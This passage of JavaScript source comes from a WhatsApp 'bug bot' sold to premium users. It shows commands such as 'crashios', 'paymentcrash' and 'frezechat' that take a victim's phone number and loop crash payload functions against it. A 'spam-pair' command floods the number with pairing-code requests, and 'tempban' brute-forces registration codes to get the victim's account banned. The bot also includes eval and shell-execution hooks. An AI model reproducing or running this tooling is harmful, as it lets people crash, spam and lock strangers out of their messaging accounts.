𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 80; i++) {
await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'xdelayui':
case 'frezechat': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 2; i++) {
await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'uiforce':
case 'paymentcrash': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 5; i++) {
await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'xios':
case 'crashios':
case 'void': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 3; i++) {
await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'trashios':
case 'locios': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 90; i++) {
await upinipin(target)
await CrashMemek(target)
await buttonnull(target)
await ForcloseNgt(target)
await sendOfferCall(target)
await stellarbriliance7(target)
await stellarbriliance8(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break

case "cekidch": case "idch": {
if (!text) return kontolreply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return kontolreply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await sock.newsletterMetadata("invite", result)
let teks = `${res.id}
`
return xreplyWithButton(teks)
}
break
case "tqto":
case "thanksto":{
xreplyWithButton(`
╭──( *› 𝖳𝖧𝖠𝖭𝖪𝖲 𝖳𝖮 ‹* ) 
│ Allah SWT ( God's )
│ Nabi Muhammad Saw ( Muslim Leader )
│ YifanModss ( Developer )
│ BinzzXd ( Bestfriend )
│ Reyy ( Bestfriend )
│ RyugaaHutaro ( Friend )
│ TonzxOfficial-ID ( Owner Pribadi )
│ Danzx_JBR ( Owner Pribadi )
│ Dapzxstacx ( Owner Pribadi )
│ All My Buyer
╰─────────────────
`) 
}
break
case "reactch":
case "rch": {
 if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
 if (!text || !args[0] || !args[1]) 
 return kontolreply(example("linkch 😐"));
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return kontolreply("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await sock.newsletterMetadata("invite", result) 
 await sock.newsletterReactMessage(res.id, serverId, args[1])
 xreplyWithButton(`Berhasil mengirim reaction 1 buah ${args[1]} ke dalam channel ${res.name}`)
}
break
case 'dana':
case 'gopay':
case 'payment': {
if (command == "dana") {
uang = `*${namastore} PAYMENT*\n\n${dana}
`
} else if (command == "ovo") {
uang = `*${namastore} PAYMENT*
${ovo}
`
} else if (command == "gopay") {
uang = `*${namastore} PAYMENT*\n\n${gopay}
`
} else if (command == "payment") {
uang = `*COMMAND PAYMENT*
- dana
- gopay

\`YifanModss Payment\``
}
await sock.sendMessage(m.chat,{image: qr, caption: uang }, { quoted: lol })
}
break
case "buysc": {
let teks = `*Script KynaX Ex4c*
[ ! ] List Harga

Ask to PV/Say a in Channel KynaX ↓

\`[ MINAT PV DEPELEPER ]\`
- WhatsApp: 6282118412445.wa.me
- Telegram: yifanmodss.t.me`
  const media = await prepareWAMessageMedia({ image: everykynax }, { upload: sock.waUploadToServer });

  const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          mentionedJid: [m.sender],
          isForwarded: true,
          forwardingScore: 200,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363422040633302@newsletter",
            newsletterName: "🐉⃟༑⌁⃰𝐊͢𝐲͡𝐧𝐚͜𝐗͢ 𝐈͡𝐧𝐯𝐢͜𝐜𝐭𝐮͢𝐬͡ ཀ͜͡🐺",
            serverMessageId: 1
          }
        },
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: media.imageMessage,
            title: teks
          },
          body: { text: "" },
          footer: { text: "Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬" },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Contact Owner",
                  url: "https://wa.me/6282118412445",
                  merchant_url: "https://wa.me/6282118412445"
                })
              }
            ]
          }
        }
      }
    }
  }), { userJid: m.chat, quoted: lol });

  sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break
case "getsc": {
let teks = `
*🕊️ السلام عليكم ${info}, أنا كيناكس، النسخة العربية*

> سكريبت مجاني كيناكس

- التلغراف: yifanmodss.t.me

—= *اضغط على الزر أدناه ↓* =—
`
  const media = await prepareWAMessageMedia({ image: everykynax }, { upload: sock.waUploadToServer });

  const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          mentionedJid: [m.sender],
          isForwarded: true,
          forwardingScore: 200,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363422040633302@newsletter",
            newsletterName: "🐉⃟༑⌁⃰𝐊͢𝐲͡𝐧𝐚͜𝐗͢ 𝐈͡𝐧𝐯𝐢͜𝐜𝐭𝐮͢𝐬͡ ཀ͜͡👑",
            serverMessageId: 1
          }
        },
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: media.imageMessage,
            title: teks
          },
          body: { text: "" },
          footer: { text: "Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬" },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Get KynaX",
                  url: "https://https://whatsapp.com/channel/0029VbCrKuDGU3BE1pCnqE2x",
                  merchant_url: "https://https://whatsapp.com/channel/0029VbCrKuDGU3BE1pCnqE2x"
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Free Script 1",
                  url: "https://scbug-yifan.vercel.app",
                  merchant_url: "https://scbug-yifan.vercel.app"
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Free Script 2",
                  url: "https://scfree-yifan.vercel.app",
                  merchant_url: "https://scfree-yifan.vercel.app"
                })
              }
            ]
          }
        }
      }
    }
  }), { userJid: m.chat, quoted: lol });

  sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break
case 'spam-pair': {
				if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
				if (!q) return kontolreply(example("62xxx|100"));
				let [peenis, pepekk = "200"] = q.split("|")
				await xreplyWithButton(`</> Awaiting, Process SpamCode to Target〽️`)
				let target = peenis.replace(/[^0-9]/g, '').trim()
				let {
					default: makeWaSocket,
					useMultiFileAuthState,
					fetchLatestBaileysVersion
				} = require('@whiskeysockets/baileys')
				let {
					state
				} = await useMultiFileAuthState('YTZYY SPAMCODE')
				let {
					version
				} = await fetchLatestBaileysVersion()
				let kynax = await makeWaSocket({
					auth: state,
					version,
					logger: pino({
						level: 'fatal'
					})
				})
				for (let i = 0; i < pepekk; i++) {
					await sleep(1500)
					let prc = await kynax.requestPairingCode(target)
					await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
				}
				await sleep(15000)
			}
break
case 'tempban': {
    if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
    if (args.length < 1) return kontolreply(example("62xxx"));
    
    const xtarget = args[0];
    if (!/^62\d{8,}$/.test(xtarget)) return kontolreply(example("62xxx"));
    
    const KANAXCountryCode = '62'; // Kode negara Indonesia
    const KANAXNumber = xtarget.replace('@s.whatsapp.net', '');
    const KANAXmerge = `${KANAXCountryCode}${KANAXNumber}`;
    const KANAXMention = KANAXmerge + '@s.whatsapp.net';
    
    await xreplyWithButton(`</> Succes Temp-Ban to ${target}〽️`);
    
    try {
        const {
            stateKANAX,
            saveCredsKANAX
        } = await useMultiFileAuthState('./band');
        
        const KANAXRequest = await sock.requestRegistrationCode({
            phoneNumber: '+' + KANAXCountryCode + `${KANAXNumber}`,
            phoneNumberCountryCode: KANAXCountryCode,
            phoneNumberNationalNumber: `${KANAXNumber}`,
            phoneNumberMobileCountryCode: 724,
            method: 'sms'
        });
    } catch (err) {
        console.error(err);
    }

    for (let i = 0; i < 10000; i++) {
        try {
            var KANAXPrefix = Math.floor(Math.random() * 999);
            var KANAXSuffix = Math.floor(Math.random() * 999);
            await sock.register(`${KANAXPrefix}-${KANAXSuffix}`);
        } catch (err) {
            console.log(`${KANAXPrefix}-${KANAXSuffix}`);
        }
    }
}
break
case "owner":
case "xowner": {
  let namaown = `Ɣ - DEV`
  let NoOwn = `6282118412445`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬\nX-WA-BIZ-NAME:[[ Yifan Devv ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
  })
  sock.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!DevOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!DevOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!DevOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
// sock.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\